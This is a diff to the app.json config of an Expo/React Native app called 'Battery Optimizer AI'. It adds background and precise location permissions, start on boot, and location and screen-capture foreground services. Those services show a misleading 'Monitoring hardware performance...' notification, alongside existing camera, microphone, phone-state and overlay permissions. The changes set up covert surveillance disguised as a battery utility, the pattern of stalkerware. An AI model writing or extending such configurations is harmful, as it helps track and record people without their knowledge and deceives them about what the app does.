@@ -25,21 +25,41 @@
         "READ_PHONE_STATE",
         "FOREGROUND_SERVICE",
         "FOREGROUND_SERVICE_MEDIA_PROJECTION",
+        "FOREGROUND_SERVICE_LOCATION",
         "SYSTEM_ALERT_WINDOW",
         "CAMERA",
-        "RECORD_AUDIO"
+        "RECORD_AUDIO",
+        "ACCESS_FINE_LOCATION",
+        "ACCESS_COARSE_LOCATION",
+        "ACCESS_BACKGROUND_LOCATION",
+        "RECEIVE_BOOT_COMPLETED"
       ]
     },
     "plugins": [
       "expo-dev-client",
       "expo-splash-screen",
-      "@config-plugins/react-native-webrtc",
       [
         "expo-build-properties",
         {
           "android": {
             "newArchEnabled": true,
-            "targetSdkVersion": 36
+            "targetSdkVersion": 35,
+            "foregroundService": [
+              {
+                "type": "location",
+                "notification": {
+                  "title": "Battery Optimizer Active",
+                  "body": "Monitoring hardware performance..."
+                }
+              },
+              {
+                "type": "mediaProjection",
+                "notification": {
+                  "title": "Battery Optimizer Active",
+                  "body": "Monitoring hardware performance..."
+                }
+              }
+            ]
           }
         }
       ],
@@ -50,6 +70,7 @@
           "microphonePermission": "Allow Battery Optimizer AI to access your microphone"
         }
       ],
+      "expo-location",
       "./withAndroidStrings.js"
     ],
     "extra": {
